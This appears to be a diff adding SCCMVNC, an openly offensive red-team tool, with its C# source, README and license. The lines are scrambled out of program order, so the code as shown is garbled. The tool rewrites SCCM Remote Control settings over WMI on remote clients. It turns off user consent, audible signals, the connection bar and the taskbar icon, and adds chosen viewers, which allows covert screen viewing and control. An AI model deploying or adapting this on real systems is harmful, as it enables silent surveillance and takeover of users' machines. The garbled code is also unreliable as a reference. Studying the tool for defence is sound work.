@@ -1,0 +1,209 @@
+    
+                    
+                    // Add viewer
+                    // Display the current value
+                    // Display the new value
+                    // Extract the Permitted Viewers
+                    // Set to view only with no remote control
+                    Help()
+                    ReadSccmRemoteControlConfig(computerName)
+                    break
+                    mObject.Put()
+                    viewOnly = true
+                // Connect to the WMI namespace
+                // Construct the WMI scope path
+                // Iterate through the results (It is supposed to be just one)
+                // Iterate through the results (usually only one)
+                // WMI query to get the Ccm_RemoteToolsConfig class
+                Help()
+                ManagementObjectCollection queryCollection = searcher.Get()
+                ManagementScope scope = new ManagementScope(wmiScopePath)
+                default:
+                else
+                foreach (ManagementObject mObject in queryCollection)
+                if (ex.ErrorCode == ManagementStatus.InvalidNamespace)
+                return
+                scope.Connect()
+                {
+                }
+            Console.WriteLine(output)
+            Console.WriteLine(separatorLine)
+            bool viewOnly = false
+            catch (Exception e)
+            catch (ManagementException ex)
+            catch (UnauthorizedAccessException)
+            for (int i = 1
+            if (output.Length < totalWidth)
+            if (processedArgs.Length == 0)
+            int padding = (totalWidth - message.Length) / 2
+            int totalWidth = 70
+            string action = processedArgs[0].ToLower()
+            string viewer = null
+            switch (action)
+            try
+            {
+            }
+        static void Help()
+        static void Main(string[] args)
+        static void PrintError(string message)
+        static void PrintStatus(string message)
+        static void ReadSccmRemoteControlConfig(string computerName)
+        {
+        }
+    class Program
+    using System
+    using System.Collections.Generic
+    using System.Management
+    using System.Runtime.InteropServices
+    {
+    }
+ // Default to local computer
+ 1 : 2
+ Compile
+ Connect to the host via native SCCM Remote Control tool
+ Details
+ SCCMVNC
+ Usage
+ e.Message)
+ ex.Message)
+ i < processedArgs.Length
+ message 
+"                    Console.WriteLine(""{0,-60}: {1}"", ""AccessLevel"", mObject[""AccessLevel""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""AllowClientChange"", mObject[""AllowClientChange""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""AllowLocalAdminToDoRemoteControl"", mObject[""AllowLocalAdminToDoRemoteControl""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""AllowRAUnsolicitedControl"", mObject[""AllowRAUnsolicitedControl""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""AllowRAUnsolicitedView"", mObject[""AllowRAUnsolicitedView""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""AllowRemCtrlToUnattended"", mObject[""AllowRemCtrlToUnattended""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""AudibleSignal"", mObject[""AudibleSignal""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""ClipboardAccessPermissionRequired"", mObject[""ClipboardAccessPermissionRequired""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current AccessLevel"", mObject[""AccessLevel""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current AllowClientChange"", mObject[""AllowClientChange""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current AllowLocalAdminToDoRemoteControl"", mObject[""AllowLocalAdminToDoRemoteControl""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current AllowRAUnsolicitedControl"", mObject[""AllowRAUnsolicitedControl""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current AllowRAUnsolicitedView"", mObject[""AllowRAUnsolicitedView""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current AllowRemCtrlToUnattended"", mObject[""AllowRemCtrlToUnattended""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current AudibleSignal"", mObject[""AudibleSignal""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current ClipboardAccessPermissionRequired"", mObject[""ClipboardAccessPermissionRequired""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current EnableRA"", mObject[""EnableRA""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current EnableTS"", mObject[""EnableTS""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current Enabled"", mObject[""Enabled""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current PermissionRequired"", mObject[""PermissionRequired""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current PermittedViewers"", currentPermittedViewers)"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current RemCtrlConnectionBar"", mObject[""RemCtrlConnectionBar""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Current RemCtrlTaskbarIcon"", mObject[""RemCtrlTaskbarIcon""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""EnableRA"", mObject[""EnableRA""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""EnableTS"", mObject[""EnableTS""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""Enabled"", mObject[""Enabled""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New AccessLevel"", mObject[""AccessLevel""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New AllowClientChange"", mObject[""AllowClientChange""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New AllowLocalAdminToDoRemoteControl"", mObject[""AllowLocalAdminToDoRemoteControl""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New AllowRAUnsolicitedControl"", mObject[""AllowRAUnsolicitedControl""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New AllowRAUnsolicitedView"", mObject[""AllowRAUnsolicitedView""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New AllowRemCtrlToUnattended"", mObject[""AllowRemCtrlToUnattended""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New AudibleSignal"", mObject[""AudibleSignal""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New ClipboardAccessPermissionRequired"", mObject[""ClipboardAccessPermissionRequired""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New EnableRA"", mObject[""EnableRA""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New EnableTS"", mObject[""EnableTS""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New Enabled"", mObject[""Enabled""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New PermissionRequired"", mObject[""PermissionRequired""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New PermittedViewers"", String.IsNullOrEmpty(viewer) "
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New RemCtrlConnectionBar"", mObject[""RemCtrlConnectionBar""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""New RemCtrlTaskbarIcon"", mObject[""RemCtrlTaskbarIcon""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""PermissionRequired"", mObject[""PermissionRequired""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""PermittedViewers"", currentPermittedViewers)"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""RemCtrlConnectionBar"", mObject[""RemCtrlConnectionBar""])"
+"                    Console.WriteLine(""{0,-60}: {1}"", ""RemCtrlTaskbarIcon"", mObject[""RemCtrlTaskbarIcon""])"
+"                    PrintError(""A management exception has occurred: "" "
+"                    PrintError(""A management exception occurred: "" "
+"                    PrintError(""The specified WMI namespace is not valid."")"
+"                    PrintError(""Unknown action."")"
+"                    PrintStatus(""Current setting"")"
+"                    PrintStatus(""Executing in the localhost..."")"
+"                    PrintStatus(""New setting"")"
+"                    PrintStatus(String.Format(""Connecting to {0}..."", computerName))"
+"                    UpdateSccmRemoteControlConfig(computerName, viewOnly, viewer)"
+"                    computerName = processedArgs[i].Substring(""/target:"".Length)"
+"                    mObject[""AccessLevel""] = viewOnly "
+"                    mObject[""AllowClientChange""] = 0"
+"                    mObject[""AllowLocalAdminToDoRemoteControl""] = 1"
+"                    mObject[""AllowRAUnsolicitedControl""] = 1"
+"                    mObject[""AllowRAUnsolicitedView""] = 1"
+"                    mObject[""AllowRemCtrlToUnattended""] = 1"
+"                    mObject[""AudibleSignal""] = 0"
+"                    mObject[""ClipboardAccessPermissionRequired""] = 0"
+"                    mObject[""EnableRA""] = 1"
+"                    mObject[""EnableTS""] = 1"
+"                    mObject[""Enabled""] = 1"
+"                    mObject[""PermissionRequired""] = 0"
+"                    mObject[""PermittedViewers""] = String.IsNullOrEmpty(viewer) "
+"                    mObject[""RemCtrlConnectionBar""] = 0"
+"                    mObject[""RemCtrlTaskbarIcon""] = 0"
+"                    string currentPermittedViewers = mObject[""PermittedViewers""] == null "
+"                    viewer = processedArgs[i].Substring(""/viewer:"".Length)"
+"                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query)"
+"                ObjectQuery query = new ObjectQuery(""SELECT "
+"                PrintError(""An unexpected error has occurred: "" "
+"                PrintError(""An unexpected error occurred: "" "
+"                PrintError(""You do not have permission to access the remote computer."")"
+"                case ""help"":"
+"                case ""read"":"
+"                case ""reconfig"":"
+"                else if (processedArgs[i].StartsWith(""/target:"", StringComparison.OrdinalIgnoreCase))"
+"                else if (processedArgs[i].StartsWith(""/viewer:"", StringComparison.OrdinalIgnoreCase))"
+"                if (computerName != ""."")"
+"                if (processedArgs[i].Equals(""/viewonly"", StringComparison.OrdinalIgnoreCase))"
+"                output = output.Insert(output.Length - 1, "" "")"
+"                string wmiScopePath = String.Format(@"""
+"            Console.WriteLine(""[-] {0}"", message)"
+"            Console.WriteLine(@""Read existing SCCM Remote Control setting:"
+"            string computerName = ""."""
+"            string input = string.Join("" "", args)"
+"            string output = """
+"            string separatorLine = new string('-', totalWidth)"
+"            string[] processedArgs = input.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries)"
+"        static void UpdateSccmRemoteControlConfig(string computerName, bool viewOnly, string viewer)"
+" """" : string.Join("","", mObject[""PermittedViewers""] as string[])"
+" """" : viewer)"
+" FROM Ccm_RemoteToolsConfig"")"
+" new string(' ', padding) "
+" null : viewer.Split(',')"
+"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
+"ActualConfig"", computerName)"
+"I have attached a copy of the files required to use the native SCCM Remote Control tool. However, it is highly recommended to copy from your SCCM server under the "
+"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
+"Imagine being able to connect to any SCCM-managed system using a VNC-like connection without the need for installing additional malicious modules, and even doing so remotely by exploiting SCCM Remote Control features."
+"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
+"Permission is hereby granted, free of charge, to any person obtaining a copy"
+"SCCMVNC.exe reconfig [/target:CLIENT01] [/viewonly] [viewer:user01,user02]"
+"SCCMVNC.exe reconfig [/target:CLIENT01] [/viewonly] [viewer:user01,user02]"")"
+"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
+"copies of the Software, and to permit persons to whom the Software is"
+"furnished to do so, subject to the following conditions:"
+"in the Software without restriction, including without limitation the rights"
+"of this software and associated documentation files (the ""Software""), to deal"
+"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
+AdminConsole
+CmRcViewer.exe <target hostname/IP>
+Copyright (c) 2024 Chris Au
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+Framework64
+MIT License
+Machine
+Microsoft Configuration Manager
+Microsoft.NET
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+Program Files (x86)
+Re-configure SCCM Remote Control setting to mute all the user conent requirement and notifications:
+Read existing SCCM Remote Control setting:
+SCCMVNC.exe read [/target:CLIENT01]
+SOFTWARE.
+The above copyright notice and this permission notice shall be included in all
+Windows
+copies or substantial portions of the Software.
+csc.exe SCCMVNC.cs
+https://www.netero1010-securitylab.com/red-team/abuse-sccm-remote-control-as-native-vnc
+i386
+namespace SCCMVNC
+policy
+root
+v4.0.30319
